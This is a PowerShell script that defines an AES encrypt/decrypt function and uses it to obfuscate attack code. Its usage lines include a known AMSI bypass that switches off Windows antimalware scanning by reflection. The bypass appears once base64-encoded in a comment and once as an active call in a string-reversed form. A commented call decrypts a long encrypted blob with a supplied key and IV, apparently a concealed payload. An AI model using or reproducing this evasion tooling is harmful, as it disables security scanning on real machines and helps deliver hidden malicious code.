Function aes {
    Param (
        [String]$Data,
        [Parameter(Mandatory=$false)]
        [String]$Key,
        [Parameter(Mandatory=$false)]
        [String]$IVector
    )

    $AES = [System.Security.Cryptography.Aes]::Create()

    if ($Key -and $IVector) {
        $AES.Key = [System.Convert]::FromBase64String($Key)
        $AES.IV = [System.Convert]::FromBase64String($IVector)
        $EncryptedBytes = [System.Convert]::FromBase64String($Data)
        $Decryptor = $AES.CreateDecryptor()
        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
        $DecryptedString = [System.Text.Encoding]::Unicode.GetString($DecryptedBytes)

        Write-Output "DecryptedString: $DecryptedString"
    } else {
        $encryptor = $AES.CreateEncryptor()
        [System.Byte[]]$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
        $EncryptedBytes = $encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
        $EncryptedBase64String = [System.Convert]::ToBase64String($EncryptedBytes)

        Write-Output "EncryptedBase64String: $EncryptedBase64String"
        Write-Output "Key: $([System.Convert]::ToBase64String($AES.Key))"
        Write-Output "IV: $([System.Convert]::ToBase64String($AES.IV))"
    }
}

# Example usage:
# aes -Data '[Ref].Assembly.GetType([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))).GetField([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),"NonPublic,Static").SetValue($null,$true);'
aes -Data '$tvkt = "slitUismA";$rftg = "deliaFtinIisma";$rdblk = ([regex]::Matches($tvkt,".","RightToLeft") | ForEach {$_.value}) -join "";$xvtg = ([regex]::Matches($rftg,".","RightToLeft") | ForEach {$_.value}) -join "";[Ref].Assembly.GetType("System.Management.Automation." + $rdblk).GetField($xvtg,"NonPublic,Static").SetValue($null,$true);'
# aes -Data "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" -Key "8lHnEzzhaqmmoTzkfIiG3Cc6AaE/pbkDuLUPdRKWbqs=" -IVector "gZqcLgEocqtTTzL9snI/Bw=="
